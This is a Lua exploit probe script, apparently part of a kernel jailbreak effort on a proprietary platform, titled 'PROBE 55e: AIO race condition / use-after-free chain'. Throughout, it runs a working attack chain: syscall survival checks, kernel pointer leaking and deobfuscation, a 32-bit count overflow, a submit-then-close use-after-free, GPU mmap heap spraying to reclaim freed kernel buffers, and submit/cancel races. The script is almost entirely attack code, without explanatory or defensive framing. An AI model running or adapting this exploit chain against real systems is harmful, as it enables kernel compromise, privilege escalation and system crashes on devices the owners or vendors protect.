-- CRASH_CLASS: HIGH
-- PROBE 55e: AIO race condition / use-after-free chain
--
-- Prerequisites: 54c/53a showed AIO syscalls 661-670 survive
-- Strategy:
--   1. Rapid AIO submit to trigger race conditions in kernel
--   2. Deobfuscate any returned kernel pointers
--   3. Submit-then-close for use-after-free on kernel AIO struct
--   4. Stack clash via 32-bit LEA overflow (count=0x40000001)
--   5. Heap spray to reclaim freed kernel buffers

print("=== PROBE 55e: AIO RACE / UAF CHAIN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

-- Pointer deobfuscation: f(x) = x ^ (x >> 4), reversed nibble-by-nibble from MSB
local function deobfuscate_ptr(val)
    local h, l = get_hi_lo(val)
    -- Work on 16 nibbles (64 bits)
    local nibbles = {}
    for i = 15, 0, -1 do
        local shift = i * 4
        if i >= 8 then
            local n = math.floor(h / (2^((i-8)*4))) % 16
            nibbles[i] = n
        else
            local n = math.floor(l / (2^(i*4))) % 16
            nibbles[i] = n
        end
    end
    -- Reverse: top nibble is unchanged, each next = enc ^ prev_decoded
    local decoded = {}
    decoded[15] = nibbles[15]  -- MSB nibble passes through
    for i = 14, 0, -1 do
        decoded[i] = (nibbles[i] ~ decoded[i+1]) % 16
    end
    -- Reconstruct
    local rh, rl = 0, 0
    for i = 15, 8, -1 do rh = rh * 16 + decoded[i] end
    for i = 7, 0, -1 do rl = rl * 16 + decoded[i] end
    return rh, rl
end

local sc661 = make_syscall(661)  -- aio_submit
local sc662 = make_syscall(662)  -- aio_multi
local sc663 = make_syscall(663)  -- aio_wait
local sc664 = make_syscall(664)  -- aio_cancel
local sc665 = make_syscall(665)  -- aio_error
local sc666 = make_syscall(666)  -- aio_result
local sc6   = make_syscall(6)    -- close
local sc_mmap = make_syscall(477)

-- ============================================================
-- Phase 1: Test AIO survival with basic args
-- ============================================================
print("[*] Phase 1: AIO survival check")

local aio_buf = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do safe_wd(aio_buf + i, 0) end

local survived = {}
for _, sc_num in ipairs({661,662,663,664,665,666,667,668,669,670}) do
    local sc = make_syscall(sc_num)
    local ok, ret = pcall(function()
        return sc(uint64(aio_buf), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        survived[sc_num] = signed32(ret)
        print(string.format("  sys %d: ret=%d", sc_num, signed32(ret)))
    else
        print(string.format("  sys %d: CRASHED", sc_num))
    end
end
print("")

-- ============================================================
-- Phase 2: Scan AIO return buffers for obfuscated kernel pointers
-- ============================================================
print("[*] Phase 2: Scan output buffers for obfuscated pointers")

for _, sc_num in ipairs({661,662,663,664,665,666}) do
    if survived[sc_num] ~= nil then
        local sc = make_syscall(sc_num)
        local buf = memory.alloc(0x200)
        for i = 0, 0x1FF, 4 do safe_wd(buf + i, 0xDEADBEEF) end

        pcall(function()
            return sc(uint64(buf), uint64(0x100), uint64(5), uint64(buf + 0x100), uint64(0))
        end)

        -- Scan buffer for changed values
        for off = 0, 0x1F8, 8 do
            local q = safe_rq(buf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h ~= 0xDEADBEEF and (h ~= 0 or l ~= 0) then
                    -- Try deobfuscation
                    local dh, dl = deobfuscate_ptr(q)
                    local is_kptr = (dh >= 0xFFFF8000 and dh < 0xFFFFFFFF)
                    print(string.format("  sys%d +0x%03X: raw=%s  deobf=0x%08X_%08X%s",
                        sc_num, off, hexval(q), dh, dl,
                        is_kptr and "  <<< KERNEL PTR!" or ""))
                end
            end
        end
    end
end
print("")

-- ============================================================
-- Phase 3: Stack clash — 32-bit LEA overflow
-- ============================================================
print("[*] Phase 3: Stack clash via count=0x40000001")
print("    Binary analysis: 32-bit LEA in sys 661/662 handler")
print("    count * struct_size can overflow 32-bit arithmetic")
print("")

-- sys 661 signature: (aiocb_array, count, ???, ???)
-- If count=0x40000001 and struct_size=16: 0x40000001*16 = 0x400000010 → truncated to 0x10
-- Kernel allocates tiny buffer, but loops over huge count → stack/heap overflow

local crash_buf = memory.alloc(0x100)
for i = 0, 0xFF, 4 do safe_wd(crash_buf + i, 0) end

-- Put valid-looking aiocb pointers in the buffer
safe_wq(crash_buf, uint64(crash_buf + 0x40))

-- Try progressively larger counts to find the overflow point
local overflow_counts = {
    0x10000001,
    0x20000001,
    0x40000001,
    0x80000001,
}

for _, count in ipairs(overflow_counts) do
    local ok2, ret2 = pcall(function()
        return sc661(uint64(crash_buf), uint64(count), uint64(0), uint64(0), uint64(0))
    end)
    if ok2 then
        print(string.format("  661(buf, 0x%X) = %d", count, signed32(ret2)))
        if signed32(ret2) == 0 then
            print("  >>> ACCEPTED! Kernel may have overflowed!")
        end
    else
        print(string.format("  661(buf, 0x%X) CRASHED: %s", count, tostring(ret2)))
        break
    end
end
print("")

-- ============================================================
-- Phase 4: Use-after-free — submit then close fd
-- ============================================================
print("[*] Phase 4: UAF — submit AIO then close fd")

-- Create a pipe for a valid fd
local sc42 = make_syscall(42)   -- pipe
local pipefds = memory.alloc(8)
safe_wd(pipefds, 0)
safe_wd(pipefds + 4, 0)

local ok3, ret3 = pcall(function() return sc42(uint64(pipefds)) end)
local pfd_r = safe_rd(pipefds)
local pfd_w = safe_rd(pipefds + 4)
print("  pipe() = " .. (ok3 and tostring(signed32(ret3)) or "FAIL"))
print("  fds: r=" .. tostring(pfd_r) .. " w=" .. tostring(pfd_w))

if ok3 and pfd_r and pfd_r > 0 then
    -- Prepare AIO control block pointing to pipe read fd
    local aiocb = memory.alloc(0x80)
    for i = 0, 0x7F, 4 do safe_wd(aiocb + i, 0) end
    safe_wd(aiocb, pfd_r)  -- aio_fildes
    local read_target = memory.alloc(0x100)
    safe_wq(aiocb + 0x10, uint64(read_target))  -- aio_buf
    safe_wq(aiocb + 0x18, uint64(0x100))         -- aio_nbytes

    -- Submit AIO read
    local ok4, ret4 = pcall(function()
        return sc661(uint64(aiocb), uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    print("  AIO submit on fd " .. pfd_r .. ": " .. (ok4 and tostring(signed32(ret4)) or "CRASH"))

    -- Immediately close the fd — kernel AIO struct references it
    local ok5, ret5 = pcall(function() return sc6(uint64(pfd_r)) end)
    print("  close(fd) = " .. (ok5 and tostring(signed32(ret5)) or "CRASH"))

    -- Try to get error/result — kernel may access freed memory
    local ok6, ret6 = pcall(function()
        return sc665(uint64(aiocb), uint64(0))  -- aio_error
    end)
    print("  aio_error after close: " .. (ok6 and tostring(signed32(ret6)) or "CRASH"))

    -- Check if anything was written to our read_target
    for off = 0, 0x78, 8 do
        local q = safe_rq(read_target + off)
        if q then
            local h, l = get_hi_lo(q)
            if h ~= 0 or l ~= 0 then
                local dh, dl = deobfuscate_ptr(q)
                print(string.format("  read_target+%02X: %s (deobf: 0x%08X_%08X)%s",
                    off, hexval(q), dh, dl,
                    (dh >= 0xFFFF8000 and dh < 0xFFFFFFFF) and " <<< KERNEL PTR!" or ""))
            end
        end
    end

    -- Now spray GPU mmap to try to reclaim the freed kernel buffer
    print("")
    print("  Spraying GPU mmap to reclaim freed kernel AIO struct...")
    local spray = {}
    for i = 1, 32 do
        local ok7, val = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
        if ok7 then
            spray[i] = val
            -- Fill with recognizable pattern (fake kernel struct)
            for off = 0, 0x3FF0, 8 do
                safe_wq(spray[i] + off, uint64(0xDEAD0000 + i))
            end
        end
    end
    print("  Sprayed " .. #spray .. " pages")

    -- Try aio_error again — if kernel references freed/reclaimed memory,
    -- it may now see our spray data
    local ok8, ret8 = pcall(function()
        return sc665(uint64(aiocb), uint64(0))
    end)
    print("  aio_error after spray: " .. (ok8 and tostring(signed32(ret8)) or "CRASH"))
end

-- ============================================================
-- Phase 5: Rapid concurrent AIO to trigger races
-- ============================================================
print("")
print("[*] Phase 5: Rapid AIO submission race")

-- Submit many AIO operations as fast as possible
-- Even without threads, rapid submit+cancel can race in kernel
local race_count = 0
for round = 1, 10 do
    local cb = memory.alloc(0x80)
    for i = 0, 0x7F, 4 do safe_wd(cb + i, 0) end
    safe_wd(cb, 1)  -- stdout
    safe_wq(cb + 0x10, uint64(crash_buf))
    safe_wq(cb + 0x18, uint64(1))

    -- Submit
    local ok_s, _ = pcall(function() return sc661(uint64(cb), uint64(1), uint64(0), uint64(0), uint64(0)) end)
    -- Immediately cancel
    local ok_c, _ = pcall(function() return sc664(uint64(cb), uint64(0), uint64(0), uint64(0)) end)

    if ok_s and ok_c then race_count = race_count + 1 end
end
print("  " .. race_count .. "/10 submit+cancel pairs survived")

print("")
print("=== PROBE 55e COMPLETE ===")
